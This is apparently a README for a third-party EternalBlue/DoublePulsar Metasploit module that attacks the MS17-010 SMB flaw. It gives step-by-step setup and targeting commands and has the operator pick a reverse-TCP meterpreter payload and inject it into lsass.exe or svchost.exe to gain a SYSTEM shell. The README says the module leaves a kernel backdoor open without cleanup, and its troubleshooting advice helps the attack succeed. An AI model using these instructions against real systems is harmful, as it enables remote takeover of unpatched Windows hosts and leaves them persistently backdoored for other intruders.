# EternalBlue
ElevenPaths EternalBlue Metasploit module - works better than Rapid 7

EternalBlue module setup (credit to ElevenPaths for their fantastic module)

One thing I could never find was a full setup guide.  I had to piece this together from other sources and how I went about the setup
*One thing to note - this module leaves the backdoor open in the SMB kernel and does not perform cleanup*

# Installation Setup

	1.) git clone https://github.com/w0rtw0rt/EternalBlue to any directory
	2.) Place eternalblue-doublepulsar.rb file into the /usr/share/metasploit-framework/modules/exploits/windows/smb folder
	3.) open terminal
	4.) dpkg --add-architecture i386 && apt-get update && apt-get install wine32
	5.) add directory in your home directory for .wine (mkdir .wine)
	6.) cd .wine 
	7.) mkdir drive_c
	8.) open metasploit (msfconsole)
	9.) use exploit/windows/smb/eternalblue_doublepulsar (should tab autocomplete if you placed in proper directory)
	10.) set proper payload for arch (windows/x64/meterpreter/reverse_tcp vs windows/meterpreter/reverse_tcp)
	11.) show options
	12.) set DOUBLEPULSARPATH to directory your DEPS folder resides (default is root/Eternalblue-Doublepulsar-Metasploit/deps/)
	13.) set ETERNALBLUEPATH to directory your DEPS folder resides (default is root/Eternalblue-Doublepulsar-Metasploit/deps/)
	14.) set RHOST *target IP*
	15.) set TARGETARCHITECTURE *x86 or x64*
	16.) set TARGET *target OS - Windows 2008/7 down to 2003/XP*
	17.) set PROCESSINJECT *running process - use lsass.exe (x64) or svchost.exe (x86) or explorer.exe if user is logged in*

At this point, when you run this module for the very first time, wine will initialize and the exploit will fail stating that 
certain dependencies could not be run.  After the initialization, run the module again and all dependencies will be set up.  
The module should complete and if your target is vulnerable, it will open the back door and inject the auto-generated payload 
to the target.  This should bring back a meterpreter shell with system level access (NTAuthority/System).

# Troubleshooting
    Q. Why did my meterpreter shell die?
    A. Chances are you injected to a process that was unstable.  For example, lsass.exe is going to crash on x86.  A notification will usually appear on the user's desktop notifying them that Windows will restart in 1 minutes due to a fatal error.
    
    Q. The module fails when I try to run it.  It gives me output saying it could not find xxxx directory
    A. Make sure you have pointed your paths to wherever you have your /deps folder residing. It will also need sudo priviliges.
    
    Q. The exploit completed but no session was created!
    A. Multiple things could come into play here:
       a.) Some security feature may be preventing outbound access from the device (reverse tcp connection)
       b.) Your target arch doesn't match your payload
       
    Q. The exploit continues to ask me "are you sure the target is vulnerable?"
    A. Chances are the target isn't vulnerable or has been patched for the ms17-010 exploit. Ensure you've enumerated properly.
